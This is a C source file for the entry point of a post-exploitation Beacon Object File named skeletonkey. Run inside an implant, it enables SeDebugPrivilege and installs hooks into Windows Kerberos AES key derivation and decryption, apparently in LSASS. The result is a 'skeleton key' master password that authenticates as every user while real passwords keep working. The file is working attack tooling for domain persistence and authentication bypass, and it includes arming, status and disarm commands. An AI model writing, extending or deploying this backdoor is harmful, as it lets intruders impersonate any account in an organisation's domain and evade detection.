/*
 * skeleton_bof.c — skeletonkey BOF entry point (AES all-users variant).
 *
 * go() receives ONE command line string and dispatches:
 *
 *   install                     install derive/decrypt hooks, print CTX addr
 *   status    <ctx>             dump fires / substHits / arm table
 *   mode      <ctx> <0|2>       0=DIAG, 2=CONDITIONAL (arm)
 *   loadtable <ctx> <path>      bulk-load realKeyHex masterRawHex lines
 *   addraw    <ctx> <rkHex> <mRawHex>
 *   setmaster <ctx> <hex>
 *   cleanup   <ctx>             disarm (mode 0); reboot clears everything
 *
 * The adaptive semantics: master password works on the attempt AFTER a failed
 * pre-auth for a table-armed account; real passwords are preserved.
 */
#include "bofdefs.h"
#include "go_common.h"
#include "kull_m_output.h"
#include "kuhl_m_skeleton_aes.h"

/* buffered output (bof_output.c) */
void bof_output_flush(void);

static void enable_se_debug_privilege(void) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
}

static ULONG_PTR skel_parse_hex_u64(const char *s) {
    ULONG_PTR v = 0;
    if (!s) return 0;
    while (*s) {
        char c = *s++;
        int d;
        if (c >= '0' && c <= '9') d = c - '0';
        else if (c >= 'a' && c <= 'f') d = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') d = c - 'A' + 10;
        else break;
        v = (v << 4) | (ULONG_PTR) d;
    }
    return v;
}

/* in-place whitespace tokenizer */
static int skel_tok(char *s, char **argv, int max) {
    int n = 0;
    while (*s && n < max) {
        while (*s == ' ' || *s == '\t' || *s == '\n' || *s == '\r') s++;
        if (!*s) break;
        argv[n++] = s;
        while (*s && *s != ' ' && *s != '\t' && *s != '\n' && *s != '\r') s++;
        if (*s) *s++ = 0;
    }
    return n;
}

static int skel_streq(const char *a, const char *b) {
    while (*a && *b) { if (*a != *b) return 0; a++; b++; }
    return *a == *b;
}

DECLSPEC_EXPORT void go(char* args, int len) {
    datap parser;
    char* cmdline = NULL;
    char* argv[8];
    int argc;

    kull_m_output_init();
    enable_se_debug_privilege();

    BeaconDataParse(&parser, args, len);
    cmdline = BeaconDataExtract(&parser, NULL);

    if (!cmdline || !*cmdline) {
        kprintf(L"[skeletonTicket] usage:\n"
                L"  skeletonTicket <password>       one-shot: install + arm (all users)\n"
                L"  skeletonTicket status <ctx>\n"
                L"  skeletonTicket mode <ctx> 0     disarm (reboot also clears)\n");
        bof_output_flush();
        return;
    }

    argc = skel_tok(cmdline, argv, 8);

    if (argc >= 1 && skel_streq(argv[0], "install")) {
        PVOID ctx = NULL;
        NTSTATUS st = kuhl_m_skeleton_aes_install(&ctx);
        if (NT_SUCCESS(st) && ctx)
            kprintf(L"[skeletonTicket] installed. CTX @ 0x%p\n", ctx);
        else
            kprintf(L"[skeletonTicket] install FAILED 0x%08x\n", st);
    }
    else if (argc >= 2 && skel_streq(argv[0], "status")) {
        kuhl_m_skeleton_aes_status((PVOID) skel_parse_hex_u64(argv[1]));
    }
    else if (argc >= 3 && skel_streq(argv[0], "mode")) {
        int m = (int) skel_parse_hex_u64(argv[2]);
        kuhl_m_skeleton_aes_mode((PVOID) skel_parse_hex_u64(argv[1]), m);
    }
    else if (argc >= 3 && skel_streq(argv[0], "setmaster")) {
        kuhl_m_skeleton_aes_setmaster((PVOID) skel_parse_hex_u64(argv[1]), argv[2]);
    }
    else if (argc >= 2 && skel_streq(argv[0], "cleanup")) {
        kuhl_m_skeleton_aes_mode((PVOID) skel_parse_hex_u64(argv[1]), 0);
        kprintf(L"[skeletonTicket] disarmed (mode 0); hooks clear on reboot\n");
    }
    else {
        /* v8: a bare token is the MASTER PASSWORD -> one-shot install + arm */
        PVOID ctx = NULL;
        NTSTATUS st = kuhl_m_skeleton_aes_install_pw(argv[0], &ctx);
        if (NT_SUCCESS(st) && ctx)
            kprintf(L"[skeletonTicket] done — master password armed for all users. CTX @ 0x%p\n", ctx);
        else
            kprintf(L"[skeletonTicket] install FAILED 0x%08x\n", st);
    }

    bof_output_flush();
}
